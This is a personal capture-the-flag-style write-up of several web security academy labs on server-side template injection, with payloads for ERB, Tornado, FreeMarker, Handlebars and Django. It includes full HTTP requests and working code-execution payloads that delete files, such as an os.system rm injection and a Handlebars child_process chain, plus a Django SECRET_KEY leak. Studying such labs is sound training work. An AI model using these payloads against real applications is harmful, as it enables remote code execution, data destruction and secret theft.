# SSTI (Server-Side Template Injection)


## Introduction
Template engines are components of common frameworks that are used to combine user supplied data
to a overall "template" to help generate web pages.

SSTI allows attackers to input template syntax to manipulate the engine and execute commands. It occurs when user input is concatenated into templates instead of being passed in as data.


## Lab: Basic server-side template injection


This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

As the template engine is ERB (Ruby) we can use `<%= 7 * 7 %>` to see if it is vulnerable.

```

GET /?message=<%=7*7%> HTTP/1.1
Host: 0a31004f034823bac0d24ae8007700a4.web-security-academy.net
Cookie: session=kDe2b7zloDz5WbHt5MjiqhN7Y39RFAEI
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0a31004f034823bac0d24ae8007700a4.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close



```

```
...
<section class="ecoms-pageheader">
<img src="/resources/images/shop.svg">
</section>
<div>49</div>
<section class="container-list-tiles">

...
```
You can see from the above response that because 7*7 evaluted to 49 this is vulnerable.

We can then use `<%=Dir.entries('.')%>` where we will find the morale.txt file and sunsequently use `<%=File.delete('./morale.txt')%> ` to delete the file.


## Lab: Basic server-side template injection (code context)

This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter 

When changing the display name with the below request you can see the evaluation of the statement when posting a comment in the display name section.

```
POST /my-account/change-blog-post-author-display HTTP/1.1
Host: 0adf008304603373c1309f1f00ce001b.web-security-academy.net
Cookie: session=4ji1BtG9OeNWubNnZ34JBOO9oXmy8DIo
Content-Length: 70
Cache-Control: max-age=0
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0adf008304603373c1309f1f00ce001b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0adf008304603373c1309f1f00ce001b.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

blog-post-author-display={{7*7}}&csrf=qF7fI6Vp3Bfc028pB23XCuXr5pG3F3i1


```

You can use the following request to remove the file however you first need to close off the origional tags:

```

POST /my-account/change-blog-post-author-display HTTP/1.1
Host: 0adf008304603373c1309f1f00ce001b.web-security-academy.net
Cookie: session=4ji1BtG9OeNWubNnZ34JBOO9oXmy8DIo
Content-Length: 78
Cache-Control: max-age=0
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0adf008304603373c1309f1f00ce001b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0adf008304603373c1309f1f00ce001b.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')&csrf=qF7fI6Vp3Bfc028pB23XCuXr5pG3F3i1

```


## Lab: Server-side template injection using documentation

This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials:
content-manager:C0nt3ntM4n4g3r

Initially I thought the template injection was in the edit username section however after some attempts I took another look around the site and it seems you are able to edit product descriptions. The product description is where the SSTI issue arises and you can see from the error that the templaye engine is FreeMarker.

After some googling around I found you can execute commands use the `Execute` class.

To remove the file I ran `${"freemarker.template.utility.Execute"?new()("rm morale.txt")}`


## Lab: Server-side template injection in an unknown language with a documented exploit


This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. 

The first thing I did was test some basic SSTI inputs ({{7*7}}) which produced an error that had references to `handlebars` allowing me to ascertain that the language was JavaScript and the template engine was handlebars.

I then wanted to find a payload which I could get code execution which I found below on PayloadAllTheThings. Change the format of the single quotes, url encoded it and send it in the vulnerable parameter which successfully deleted morale.txt.



```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('rm morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}


```

## Lab: Server-side template injection with information disclosure via user-supplied objects



This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.

To solve the lab, steal and submit the framework's secret key.

You can log in to your own account using the following credentials:
content-manager:C0nt3ntM4n4g3r


I used a similar process to the last exercise when I input some random data to attempt to provoke an error message and when the message appeared I found it was using Python Django.

Googling around I found there is a property called SECRET_KEY which I assumed was what the exercise was referencing.

Using this information I was able to get the solution by injecting the following:
`{{settings.SECRET_KEY}}`.

Solution: d6o0t0xjigro8kd6a335galywkq55ayu





## Lab: Server-side template injection in a sandboxed environment

This lab uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox. To solve the lab, break out of the sandbox to read the file my_password.txt from Carlos's home directory. Then submit the contents of the file.

You can log in to your own account using the following credentials:
content-manager:C0nt3ntM4n4g3r

Due to the sandboxing we are not able to use `${"freemarker.template.utility.Execute"?new()("rm my_password.txt")}`


Due to the sandboxing we are limited only to specific objects and methods provided by the application



# references
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

- https://docs.djangoproject.com/en/4.1/ref/settings/#std-setting-SECRET_KEY

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md

- https://freemarker.apache.org/docs/api/freemarker/template/utility/Execute.html
